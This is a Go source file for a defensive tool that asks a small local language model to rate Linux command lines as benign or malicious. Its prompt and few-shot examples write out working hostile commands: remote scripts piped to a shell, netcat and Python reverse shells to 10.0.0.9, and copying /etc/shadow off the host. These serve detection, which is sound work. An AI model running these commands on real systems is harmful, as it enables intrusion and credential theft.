package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// Scorer is the seam between main.go and any backend. OllamaClient (real model)
// and MockScorer (keyword heuristic) both satisfy it, so swapping backends never
// touches the pipeline in main.go.
type Scorer interface {
	Score(ctx context.Context, e ExecEvent) (ScoreResult, error)
	Name() string
}

// systemPrompt frames the model (llama3.2:1b) as a Linux endpoint analyst and
// pins the output shape. The model is small, so accuracy is won here — keep it
// Linux-oriented and expand the tradecraft hints / few-shot pairs over time.
const systemPrompt = `You are a Linux endpoint security analyst. You are given a single process execution (the command line plus a little context) and must judge how likely it is to be malicious.

Reply with ONLY a single JSON object, no prose, with exactly these keys:
{"risk_score": <float 0..1, probability the command is malicious>,
 "verdict": "benign"|"suspicious"|"malicious",
 "reason": "<one short sentence, 12 words max>",
 "risk_indicators": ["<short tokens, e.g. curl|sh>"]}

Linux tradecraft that raises risk:
- piping a downloader into a shell (curl/wget ... | sh|bash)
- executing from world-writable/temp dirs (/tmp, /dev/shm, /var/tmp)
- base64/xxd/openssl-decoded payloads fed to an interpreter
- reverse shells (bash -i >& /dev/tcp/..., nc -e, mkfifo+sh)
- LD_PRELOAD / LD_LIBRARY_PATH hijacks
- touching credentials/persistence (/etc/shadow, ~/.ssh, cron, systemd units)
- chmod +x on a freshly dropped file

Benign administrative commands (package managers, ls, cat, git, normal service
restarts) should score LOW even when they superficially resemble the above.`

// fewShot pairs teach the line between benign and malicious. Include benign
// twins of malicious commands. Pull more from the SENTRY corpus during tuning.
var fewShot = []struct {
	Command string
	JSON    string
}{
	// --- benign (keep these so the model doesn't over-flag) ---
	{
		Command: "apt-get update",
		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","risk_indicators":[]}`,
	},
	{
		// Benign twin: a desktop/JS process that superficially looks scriptish
		// but is a normal GNOME extension — must score LOW (curbs false positives).
		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","risk_indicators":[]}`,
	},
	// --- malicious / suspicious tradecraft, by their own argv (so DIRECT,
	//     non-bash commands get flagged — a 1B model leans on these examples) ---
	{
		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script piped into a shell","risk_indicators":["curl|sh"]}`,
	},
	{
		Command: "nc -e /bin/sh 10.0.0.9 4444",
		JSON:    `{"risk_score":0.96,"verdict":"malicious","reason":"netcat reverse shell to a remote host","risk_indicators":["nc -e","reverse-shell"]}`,
	},
	{
		Command: "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.9',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])",
		JSON:    `{"risk_score":0.96,"verdict":"malicious","reason":"python reverse shell","risk_indicators":["python","reverse-shell"]}`,
	},
	{
		Command: "cat /etc/shadow",
		JSON:    `{"risk_score":0.8,"verdict":"malicious","reason":"reading the password hash file","risk_indicators":["/etc/shadow","credential-access"]}`,
	},
	{
		Command: "scp /etc/shadow root@10.0.0.9:/tmp/",
		JSON:    `{"risk_score":0.9,"verdict":"malicious","reason":"exfiltrating credentials to a remote host","risk_indicators":["scp","exfil"]}`,
	},
	{
		Command: "useradd -o -u 0 -g 0 backdoor",
		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"creating a hidden uid-0 backdoor account","risk_indicators":["useradd","uid-0"]}`,
	},
	{
		Command: "nmap -sS 192.168.0.0/24",
		JSON:    `{"risk_score":0.6,"verdict":"suspicious","reason":"network port scan / reconnaissance","risk_indicators":["nmap","recon"]}`,
	},
	{
		Command: "chmod 777 /tmp/payload",
		JSON:    `{"risk_score":0.55,"verdict":"suspicious","reason":"making a dropped file world-executable","risk_indicators":["chmod","tmp-exec"]}`,
	},
}

// validVerdicts is the allowed verdict label set.
var validVerdicts = map[string]bool{"benign": true, "suspicious": true, "malicious": true}

// OllamaClient scores commands via a local Ollama server running a small model.
type OllamaClient struct {
	Endpoint string
	Model    string
	http     *http.Client
}

// NewOllamaClient builds a client for the local Ollama HTTP API.
func NewOllamaClient(model string) *OllamaClient {
	return &OllamaClient{
		Endpoint: "http://localhost:11434/api/generate",
		Model:    model,
		http:     &http.Client{Timeout: 60 * time.Second},
	}
}

// Name identifies the backend in logs.
func (c *OllamaClient) Name() string { return "ollama:" + c.Model }

type ollamaRequest struct {
	Model   string         `json:"model"`
	Prompt  string         `json:"prompt"`
	Stream  bool           `json:"stream"`
	Format  string         `json:"format,omitempty"`
	Options map[string]any `json:"options"`
}

type ollamaResponse struct {
	Response string `json:"response"`
	Done     bool   `json:"done"`
}

// Score sends the command to the model and parses its JSON verdict. temperature
// is pinned to 0 for repeatable verdicts.
func (c *OllamaClient) Score(ctx context.Context, e ExecEvent) (ScoreResult, error) {
	reqBody, err := json.Marshal(ollamaRequest{
		Model:  c.Model,
		Prompt: buildPrompt(e),
		Stream: false,
		Format: "json", // force the model to emit a valid JSON object
		// temperature 0 for repeatable verdicts; num_predict caps output (small —
		// we ask for only score+verdict+short reason+indicators, no mitre).
		Options: map[string]any{"temperature": 0, "num_predict": 96},
	})
	if err != nil {
		return ScoreResult{}, err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.Endpoint, bytes.NewReader(reqBody))
	if err != nil {
		return ScoreResult{}, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.http.Do(req)
	if err != nil {
		return ScoreResult{}, fmt.Errorf("ollama request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ScoreResult{}, err
	}
	if resp.StatusCode != http.StatusOK {
		return ScoreResult{}, fmt.Errorf("ollama status %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
	}

	var or ollamaResponse
	if err := json.Unmarshal(body, &or); err != nil {
		return ScoreResult{}, fmt.Errorf("decode ollama envelope: %w", err)
	}
	return parseResult(or.Response)
}

// buildPrompt assembles the full prompt: system framing, few-shot pairs, and the
// command under test with any high-signal context (cwd, LD_PRELOAD).
func buildPrompt(e ExecEvent) string {
	var b strings.Builder
	b.WriteString(systemPrompt)
	b.WriteString("\n\nExamples:\n")
	for _, ex := range fewShot {
		fmt.Fprintf(&b, "COMMAND: %s\nJSON: %s\n", ex.Command, ex.JSON)
	}
	b.WriteString("\nNow score this execution. Respond with ONLY the JSON object.\n")
	fmt.Fprintf(&b, "executable: %s\n", e.Executable)
	if e.ParentComm != "" {
		fmt.Fprintf(&b, "parent: %s\n", e.ParentComm)
	}
	if e.CWD != nil && *e.CWD != "" {
		fmt.Fprintf(&b, "cwd: %s\n", *e.CWD)
	}
	if e.LDPreload != nil && *e.LDPreload != "" {
		fmt.Fprintf(&b, "LD_PRELOAD: %s\n", *e.LDPreload)
	}
	fmt.Fprintf(&b, "COMMAND: %s\nJSON: ", e.CommandLine())
	return b.String()
}

// rawResult is the model's expected JSON shape. risk_score is a pointer so we
// can tell "absent" from "0". mitre is no longer requested (dropped to cut
// output tokens and because a 1B model hallucinated codes); Verdict.Mitre is
// always emitted empty.
type rawResult struct {
	RiskScore      *float64 `json:"risk_score"`
	Verdict        string   `json:"verdict"`
	Reason         string   `json:"reason"`
	RiskIndicators []string `json:"risk_indicators"`
}

// parseResult extracts the JSON object from the model's output (even if wrapped
// in prose), clamps risk_score to [0,1], and fills a missing verdict from the
// banded score.
func parseResult(text string) (ScoreResult, error) {
	js, err := extractJSON(text)
	if err != nil {
		return ScoreResult{}, err
	}

	var raw rawResult
	if err := json.Unmarshal([]byte(js), &raw); err != nil {
		return ScoreResult{}, fmt.Errorf("parse model JSON: %w", err)
	}

	score := 0.0
	if raw.RiskScore != nil {
		score = *raw.RiskScore
	}
	if score < 0 {
		score = 0
	}
	if score > 1 {
		score = 1
	}

	// Validate the verdict label against the enum; fall back to the banded
	// score when the model returns an empty or bogus value (e.g. "high").
	verdict := strings.ToLower(strings.TrimSpace(raw.Verdict))
	if !validVerdicts[verdict] {
		verdict = verdictForScore(score)
	}

	return ScoreResult{
		RiskScore:      score,
		Verdict:        verdict,
		Reason:         strings.TrimSpace(raw.Reason),
		Mitre:          []string{}, // no longer requested from the model
		RiskIndicators: raw.RiskIndicators,
	}, nil
}

// extractJSON pulls the first balanced {...} object out of arbitrary text,
// ignoring braces inside JSON strings.
func extractJSON(text string) (string, error) {
	start := strings.IndexByte(text, '{')
	if start < 0 {
		return "", errors.New("no JSON object in model output")
	}
	depth := 0
	inStr := false
	esc := false
	for i := start; i < len(text); i++ {
		ch := text[i]
		if inStr {
			switch {
			case esc:
				esc = false
			case ch == '\\':
				esc = true
			case ch == '"':
				inStr = false
			}
			continue
		}
		switch ch {
		case '"':
			inStr = true
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return text[start : i+1], nil
			}
		}
	}
	return "", errors.New("unbalanced JSON object in model output")
}
